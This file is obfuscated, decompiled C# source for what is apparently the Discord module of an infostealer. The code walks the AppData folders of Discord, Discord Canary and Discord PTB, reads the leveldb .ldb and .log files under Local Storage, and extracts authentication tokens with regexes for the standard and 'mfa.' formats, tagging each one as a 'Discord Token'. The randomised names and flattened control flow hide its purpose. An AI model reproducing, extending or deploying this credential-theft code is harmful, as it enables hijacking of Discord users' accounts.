using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using p3N5Y;

namespace ZAZUx;

public class pwiGr : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string _8EFdKt
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public pwiGr()
	{
		_8EFdKt = "Discord";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<string>.Enumerator enumerator = default;
		List<string> list = default;
		List<ii68> list2 = default;
		do
		{
			if (num == 3)
			{
				enumerator = list.GetEnumerator();
				num = 4;
			}
			if (num == 1)
			{
				list2 = new List<ii68>();
				num = 2;
			}
			if (num == 2)
			{
				list = mJU1cnKFYM();
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		try
		{
			while (enumerator.MoveNext())
			{
				string current = enumerator.Current;
				list2.Add(new ii68
				{
					byIdLuuGZbL = "discord.com",
					oVAe = _8EFdKt,
					S8v = "Discord Token",
					_9H5rP7hg2 = current
				});
			}
			return list2;
		}
		finally
		{
			((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
		}
	}

	public static List<string> mJU1cnKFYM()
	{
		int num = 0;
		List<string> list = default;
		List<string>.Enumerator enumerator = default;
		List<string> list2 = default;
		do
		{
			if (num == 1)
			{
				list = _6m7Q0G();
				num = 2;
			}
			if (num == 3)
			{
				enumerator = list.GetEnumerator();
				num = 4;
			}
			if (num == 2)
			{
				list2 = new List<string>();
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		try
		{
			while (enumerator.MoveNext())
			{
				string current = enumerator.Current;
				foreach (Match item in Regex.Matches(current, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
				{
					list2.Add(item.Value);
				}
				foreach (Match item2 in Regex.Matches(current, "mfa\\.[\\w-]{84}"))
				{
					list2.Add(item2.Value);
				}
			}
			return list2;
		}
		finally
		{
			((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
		}
	}

	private static List<string> _6m7Q0G()
	{
		int num = 0;
		string path = default;
		string text = default;
		string[] array = default;
		string[] array2 = default;
		string[] array3 = default;
		string folderPath = default;
		int num2 = default;
		List<string> list = default;
		int num3 = default;
		string[] array4 = default;
		string[] files = default;
		string path3 = default;
		string[] files2 = default;
		while (true)
		{
			if (num == 13)
			{
				path = Path.Combine(text, "Local Storage\\leveldb");
				num = 14;
			}
			if (num == 8)
			{
				array = array2;
				num = 9;
			}
			if (num == 10)
			{
				goto IL_04ba;
			}
			if (num == 5)
			{
				array3[2] = Path.Combine(folderPath, "discordptb");
				num = 6;
			}
			if (num == 1)
			{
				folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				num = 2;
			}
			if (num == 3)
			{
				array3[0] = Path.Combine(folderPath, "Discord");
				num = 4;
			}
			if (num == 19)
			{
				goto IL_03e7;
			}
			if (num == 18)
			{
				num2 = 0;
				num = 19;
			}
			if (num == 7)
			{
				list = new List<string>();
				num = 8;
			}
			if (num == 2)
			{
				array3 = new string[3];
				num = 3;
			}
			if (num == 14)
			{
				if (!Directory.Exists(path))
				{
					goto IL_04ac;
				}
				num = 15;
			}
			if (num == 12)
			{
				if (!Directory.Exists(text))
				{
					goto IL_04ac;
				}
				num = 13;
			}
			if (num == 9)
			{
				num3 = 0;
				num = 10;
			}
			if (num == 20)
			{
				goto IL_0218;
			}
			goto IL_022e;
			IL_02b4:
			text = array[num3];
			num = 12;
			goto IL_02ca;
			IL_03e7:
			if (num2 < array4.Length)
			{
				goto IL_0218;
			}
			string[] array5 = files;
			foreach (string path2 in array5)
			{
				try
				{
					using FileStream stream = new FileStream(path2, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					using StreamReader streamReader = new StreamReader(stream);
					list.Add(streamReader.ReadToEnd());
				}
				catch
				{
				}
			}
			goto IL_04ac;
			IL_04ba:
			if (num3 >= array.Length)
			{
				break;
			}
			goto IL_02b4;
			IL_02ca:
			if (num == 16)
			{
				files = Directory.GetFiles(path, "*.log", SearchOption.AllDirectories);
				num = 17;
			}
			if (num == 4)
			{
				array3[1] = Path.Combine(folderPath, "discordcanary");
				num = 5;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num != 21)
			{
				continue;
			}
			try
			{
				using FileStream stream2 = new FileStream(path3, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				using StreamReader streamReader2 = new StreamReader(stream2);
				list.Add(streamReader2.ReadToEnd());
			}
			catch
			{
			}
			num2++;
			goto IL_03e7;
			IL_022e:
			if (num == 15)
			{
				files2 = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);
				num = 16;
			}
			if (num == 17)
			{
				array4 = files2;
				num = 18;
			}
			if (num == 6)
			{
				array2 = array3;
				num = 7;
			}
			if (num == 11)
			{
				goto IL_02b4;
			}
			goto IL_02ca;
			IL_04ac:
			num3++;
			goto IL_04ba;
			IL_0218:
			path3 = array4[num2];
			num = 21;
			goto IL_022e;
		}
		return list;
	}
}
